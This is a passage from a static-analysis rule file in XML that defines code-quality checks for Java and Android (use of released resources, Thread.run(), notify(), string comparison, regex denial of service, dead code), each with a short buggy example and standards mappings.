							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 252, CWE ID 754</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Risky Resource Management - CWE ID 754</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>code_quality_android_bad_practices_use_of_released_camera_resource
		</key>
		<internalKey>Code Quality/Android Bad Practices/Use of Released Camera
			Resource
		</internalKey>
		<name>Android Bad Practices: Use of Released Camera Resource</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The code references the <code>Camera</code> object after it has already been released.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The code attempts to use the <code>Camera</code> object after the it has already been released. Any further references to the <code>Camera</code> object without reacquiring the resource will throw an exception, and can cause the application to crash if the exception is not caught.<br><br><b>Example:</b> The following code uses a toggle button to toggle the camera preview on and off. After the user taps the button once, the camera preview stops and the camera resource is released. However, if she taps the button again, <code>startPreview()</code> is called on the previously-released <code>Camera</code> object.<br><br><pre><br>public class ReuseCameraActivity extends Activity {<br>  private Camera cam;<br><br>  ...<br>  private class CameraButtonListener implements OnClickListener {<br>      public void onClick(View v) {<br>          if (toggle) {<br>              cam.stopPreview();<br>              cam.release();<br>          }<br>          else {<br>              cam.startPreview();<br>          }<br>          toggle = !toggle;<br>      }<br>  }<br>  ...<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7]  <em>Camera, Android Developers</em> <br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 416</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_android_bad_practices_use_of_released_media_resource
		</key>
		<internalKey>Code Quality/Android Bad Practices/Use of Released Media
			Resource
		</internalKey>
		<name>Android Bad Practices: Use of Released Media Resource</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The code references the Android media object after it has already been released.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The code attempts to use the media object after the it has already been released. Any further references to that media object without reacquiring the resource will throw an exception, and can cause the application to crash if the exception is not caught.<br><br><b>Example:</b> The following code uses a pause button to toggle the media playback. After the user taps the button once, the current song or video is paused and the camera resource is released. However, if she taps the button again, <code>start()</code> is called on the previously-released media resource.<br><br><pre><br>public class ReuseMediaPlayerActivity extends Activity {<br>  private MediaPlayer mp;<br><br>  ...<br>  private class PauseButtonListener implements OnClickListener {<br>      public void onClick(View v) {<br>          if (paused) {<br>              mp.pause();<br>              mp.release();<br>          }<br>          else {<br>              mp.start();<br>          }<br>          paused = !paused;<br>      }<br>  }<br>  ...<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7]  <em>Audio Capture, Android Developers</em> <br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 416</em> <br></p>
																									   <p>[9]  <em>Media Player, Android Developers</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_android_bad_practices_use_of_released_sqlite_resource
		</key>
		<internalKey>Code Quality/Android Bad Practices/Use of Released SQLite
			Resource
		</internalKey>
		<name>Android Bad Practices: Use of Released SQLite Resource</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The code references the Android database handler after it has already been released.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The code attempts to use the Android SQLite database handler after the it has already been closed. Any further references to the handler without re-establishing the database connection will throw an exception, and can cause the application to crash if the exception is not caught.<br><br><b>Example:</b> The following code might be from a program that caches user values temporarily in memory, but can call <code>flushUpdates()</code> to commit the changes to disk. The method properly closes the database handler after writing updates to the database. However, when <code>flushUpdates()</code> is called again, the database object is referenced again before reinitializing it.<br><br><pre><br>public class ReuseDBActivity extends Activity {<br>  private myDBHelper dbHelper;<br>  private SQLiteDatabase db;<br><br>  @Override<br>  public void onCreate(Bundle state) {<br>      ...<br>      db = dbHelper.getWritableDatabase();<br>      ...<br>  }<br>  ...<br><br>  private void flushUpdates() {<br>      db.insert(cached_data);     // flush cached data<br>      dbHelper.close();<br>  }<br>  ...<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 416</em> <br></p>
																									   <p>[8]  <em>Data Storage, Android Developers</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_code_correctness_call_to_thread_run_</key>
		<internalKey>Code Quality/Code Correctness/Call to Thread.run()
		</internalKey>
		<name>Code Correctness: Call to Thread.run()</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program calls a thread's <code>run()</code> method instead of calling <code>start()</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  In most cases a direct call to a <code>Thread</code> object's <code>run()</code> method is a bug. The programmer intended to begin a new thread of control, but accidentally called <code>run()</code> instead of <code>start()</code>, so the <code>run()</code> method will execute in the caller's thread of control.<br><br><b>Example 1:</b> The following excerpt from a Java program mistakenly calls <code>run()</code> instead of <code>start()</code>.<br><br><pre><br>    Thread thr = new Thread() {<br>      public void run() {<br>        ...<br>      }<br>    };<br><br>  thr.run();<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 572</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_code_correctness_call_to_notify_</key>
		<internalKey>Code Quality/Code Correctness/Call to notify()
		</internalKey>
		<name>Code Correctness: Call to notify()</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  It is ambiguous which thread will wake up when <code>notify()</code> is called.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  There is no way to specify which thread will be awakened by calls to <code>notify()</code>.<br><br><b>Example 1:</b> In the following code, <code>notifyJob()</code> calls <code>notify()</code>.<br><pre><br>public synchronized notifyJob() {<br>flag = true;<br>notify();<br>}<br>...<br>public synchronized waitForSomething() {<br>while(!flag) {<br>    try {<br>        wait();<br>    }<br>    catch (InterruptedException e)<br>    {<br>        ...<br>    }<br>}<br>...<br>}<br></pre><br>In this case, the developer intends to wake up the thread that calls <code>wait()</code>, but it is possible that <code>notify()</code> will notify a different thread than the intended one.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 373</em> <br></p>
																									   <p>[2] Sun Microsystems, Inc. <em>Java Sun Tutorial - Concurrency</em> <br></p>
																									   <p>[3] Sun Microsystems, Inc. <em>Java Sun Tutorial - Concurrency</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_code_correctness_class_does_not_implement_cloneable
		</key>
		<internalKey>Code Quality/Code Correctness/Class Does Not Implement
			Cloneable
		</internalKey>
		<name>Code Correctness: Class Does Not Implement Cloneable</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This class implements a <code>clone()</code> method but does not implement the <code>Cloneable</code> interface.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It appears that the programmer intended for this class to implement the <code>Cloneable</code> interface because it implements a method named <code>clone()</code>. However, the class does not implement the <code>Cloneable</code> interface and the <code>clone()</code> method will not behave correctly.<br><br><b>Example 1:</b> Calling <code>clone()</code> for this class will result in a <code>CloneNotSupportedException.</code><br><br><pre><br>public class Kibitzer {<br>  public Object clone() throws CloneNotSupportedException {<br>    ...<br>  }<br>}<br><br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 498</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_code_correctness_erroneous_class_compare</key>
		<internalKey>Code Quality/Code Correctness/Erroneous Class Compare
		</internalKey>
		<name>Code Correctness: Erroneous Class Compare</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Determining an object's type based on its class name can lead to unexpected behavior or allow an attacker to inject a malicious class.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Attackers may deliberately duplicate class names in order to cause a program to execute malicious code. For this reason, class names are not good type identifiers and should not be used as the basis for granting trust to a given object.<br><br>Example 1: The following code opts to trust or distrust input from an <code>inputReader</code> object based on its class name. If an attacker is able to supply an implementation of <code>inputReader</code> that executes malicious commands, this code will be unable to differentiate the benign and malicious versions of the object.<br><br><pre><br>if (inputReader.getClass().getName().equals("TrustedName"))<br>{<br>   input = inputReader.getInput();<br>   ...<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 486</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_code_correctness_erroneous_negative_value</key>
		<internalKey>Code Quality/Code Correctness/Erroneous Negative Value
		</internalKey>
		<name>Code Correctness: Erroneous Negative Value</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A field is erroneously assigned a negative value.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This variable has been annotated with FortifyNonNegative, which is used to indicate that negative values are not permitted.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 20</em> <br></p>
																									   <p>[2] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 020</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_code_correctness_erroneous_string_compare</key>
		<internalKey>Code Quality/Code Correctness/Erroneous String Compare
		</internalKey>
		<name>Code Correctness: Erroneous String Compare</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Strings should be compared with the <code>equals()</code> method, not <code>==</code> or <code>!=</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This program uses <code>==</code> or <code>!=</code> to compare two strings for equality, which compares two objects for equality, not their values. Chances are good that the two references will never be equal.<br><br><b>Example 1:</b> The following branch will never be taken.<br><br><pre><br>  if (args[0] == STRING_CONSTANT) {<br>      logger.info("miracle");<br>  }<br></pre><br><br>The <code>==</code> and <code>!=</code> operators will only behave as expected when they are used to compare strings contained in objects that are equal. The most common way for this to occur is for the strings to be interned, whereby the strings are added to a pool of objects maintained by the <code>String</code> class. Once a string is interned, all uses of that string will use the same object and equality operators will behave as expected. All string literals and string-valued constants are interned automatically. Other strings can be interned manually be calling <code>String.intern()</code>, which will return a canonical instance of the current string, creating one if necessary.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 597</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_code_correctness_erroneous_zero_value</key>
		<internalKey>Code Quality/Code Correctness/Erroneous Zero Value
		</internalKey>
		<name>Code Correctness: Erroneous Zero Value</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A variable is erroneously assigned a zero value.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This variable has been annotated with FortifyNonZero, which is used to indicate that zero is not a permitted value.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 20</em> <br></p>
																									   <p>[2] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 020</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_code_correctness_incorrect_serialpersistentfields_modifier
		</key>
		<internalKey>Code Quality/Code Correctness/Incorrect
			serialPersistentFields Modifier
		</internalKey>
		<name>Code Correctness: Incorrect serialPersistentFields Modifier
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  To use <code>serialPersistentFields</code> correctly, it must be declared <code>private</code>, <code>static</code>, and <code>final</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Java Object Serialization Specification allows developers to manually define Serializable fields for a class by specifying them in the <code>serialPersistentFields</code> array. This feature will only work if <code>serialPersistentFields</code> is declared as <code>private</code>, <code>static</code>, and <code>final</code>.<br><br><b>Example 1: </b> The following declaration of <code>serialPersistentFields</code> will not be used to define <code>Serializable</code> fields because it is not <code>private</code>, <code>static</code>, and <code>final</code>.<br><pre><br>class List implements Serializable {<br>public ObjectStreamField[] serialPersistentFields = { new ObjectStreamField("myField", List.class) };<br>...<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 485</em> <br></p>
																									   <p>[2] Sun Microsystems, Inc. <em>Java Sun Tutorial</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_code_correctness_misleading_method_signature</key>
		<internalKey>Code Quality/Code Correctness/Misleading Method Signature
		</internalKey>
		<name>Code Correctness: Misleading Method Signature</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This looks like an effort to override a common Java method, but it probably does not have the intended effect.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This method's name is similar to a common Java method name, but it is either spelled incorrectly or the argument list causes it to not override the intended method.<br><br><b>Example 1:</b> The following method is meant to override <code>Object.equals()</code>:<br><br><pre><br>public boolean equals(Object obj1, Object obj2) {<br>  ...<br>}<br></pre><br><br>But since <code>Object.equals()</code> only takes a single argument, the method above is never called.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_code_correctness_non_synchronized_method_overrides_synchronized_method
		</key>
		<internalKey>Code Quality/Code Correctness/Non-Synchronized Method
			Overrides Synchronized Method
		</internalKey>
		<name>Code Correctness: Non-Synchronized Method Overrides Synchronized
			Method
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Synchronized methods should not be overridden with non-syncrhonized methods.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A parent class declared the method <Replace key="$f.name$"/> <code>synchronized</code>, guaranteeing correct behavior when multiple threads access the same instance. All overriding methods should also be declared <code>synchronized</code>, otherwise unexpected behavior may occur.<br><br><b>Example 1:</b> In the following code, the class <code>Foo</code> overrides the class <code>Bar</code> but does not declare the method <code>synchronizedMethod</code> to be <code>synchronized</code>:<br><br><pre><br>public class Bar {<br>public synchronized void synchronizedMethod() {<br>    for (int i=0; i&lt;10; i++) System.out.print(i);<br>    System.out.println();<br>}<br>}<br><br>public class Foo extends Bar {<br>public void synchronizedMethod() {<br>    for (int i=0; i&lt;10; i++) System.out.print(i);<br>    System.out.println();<br>}<br>}</pre><br><br>In this case, an instance of <code>Foo</code> could be cast to type <code>Bar</code>. If the same instance is given to two separate threads and <code>synchronizedMethod</code> is executed repeatedly, the behavior will be unpredictable.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Sun Microsystems, Inc. <em>Bug ID: 4294756 Javac should warn if synchronized method is overridden with a non synchronized</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_code_correctness_regular_expressions_denial_of_service
		</key>
		<internalKey>Code Quality/Code Correctness/Regular Expressions Denial
			of Service
		</internalKey>
		<name>Code Correctness: Regular Expressions Denial of Service</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Untrusted data is passed to the application and used as a regular expression.  This can cause the thread to over-consume CPU resources.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  There is a vulnerability in implementations of regular expression evaluators and related methods that can cause the thread to hang when evaluating repeating and alternating overlapping of nested and repeated regex groups. This defect can be used to execute a DOS (Denial of Service) attack.<br><b>Example:</b><br>    <pre><br>        (e+)+<br>        ([a-zA-Z]+)*<br>        </pre><br>        There are no known regular expression implementations which are immune to this vulnerability.  All platforms and languages are vulnerable to this attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 185, CWE ID 730</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Denial of Service</em> <br></p>
																									   <p>[9] Bryan Sullivan <em>Regular Expression Denial of Service Attacks and Defenses</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_code_correctness_null_argument_to_equals_</key>
		<internalKey>Code Quality/Code Correctness/null Argument to equals()
		</internalKey>
		<name>Code Correctness: null Argument to equals()</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The expression <code>obj.equals(null)</code> will always be false.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The program uses the <code>equals()</code> method to compare an object with <code>null</code>. This comparison will always return false, since the object is not <code>null</code>. (If the object is null, the program will throw a <code>NullPointerException</code>).
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398, CWE ID 754</em> <br></p>
																									   <p>[2]  <em>JavaDoc for Object</em> Sun Microsystems<br></p>
																									   <p>[3] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Risky Resource Management - CWE ID 754</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_dead_code_empty_try_block</key>
		<internalKey>Code Quality/Dead Code/Empty Try Block</internalKey>
		<name>Dead Code: Empty Try Block</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Empty try blocks are either dead code or indicate the presence of debug code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An empty try block serves no functional purpose. In fact, when compiled to byte code, the empty try block is optimized out and never makes it into the finished program. An empty try block might be indicative of code that has been removed or commented out.<br><b>Example 1:</b> The following code contains an empty try block.<br><pre><br>try {<br>//rs = stmt.executeQuery(query);<br>}<br>catch(SQLException e) {<br>log(e);<br>}<br></pre><br>Dead code negatively impacts code quality, making code harder to read, understand, and maintain.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3050 CAT II</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3050 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3050 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3050 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3050 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 561</em> <br></p>
																									   <p>[7] Sun Microsystems, Inc. <em>Java Sun Tutorial</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>code-quality</tag>
	</rule>
	<rule>
		<key>code_quality_dead_code_expression_is_always_false</key>
		<internalKey>Code Quality/Dead Code/Expression is Always false
		</internalKey>
		<name>Dead Code: Expression is Always false</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This expression (or part of it) will always evaluate to <code>false</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This expression (or part of it) will always evaluate to <code>false</code>; the program could be rewritten in a simpler form. The nearby code may be present for debugging purposes, or it may not have been maintained along with the rest of the program. The expression may also be indicative of a bug earlier in the method.<br><br><b>Example 1:</b> The following method never sets the variable <code>secondCall</code> after initializing it to <code>false</code>. (The variable <code>firstCall</code> is mistakenly used twice.)  The result is that the expression <code>firstCall &amp;&amp; secondCall</code> will always evaluate to <code>false</code>, so <code>setUpDualCall()</code> will never be invoked.<br><br><pre><br>public void setUpCalls() {<br>  boolean firstCall = false;<br>  boolean secondCall = false;<br><br>  if (fCall &gt; 0) {<br>    setUpFCall();<br>    firstCall = true;<br>  }<br>  if (sCall &gt; 0) {<br>    setUpSCall();<br>    firstCall = true;<br>  }<br><br>  if (firstCall &amp;&amp; secondCall) {<br>    setUpDualCall();<br>  }<br>}<br></pre><br><br><b>Example 2:</b> The following method never sets the variable <code>firstCall</code> to <code>true</code>. (The variable <code>firstCall</code> is mistakenly set to <code>false</code> after the first conditional statement.)  The result is 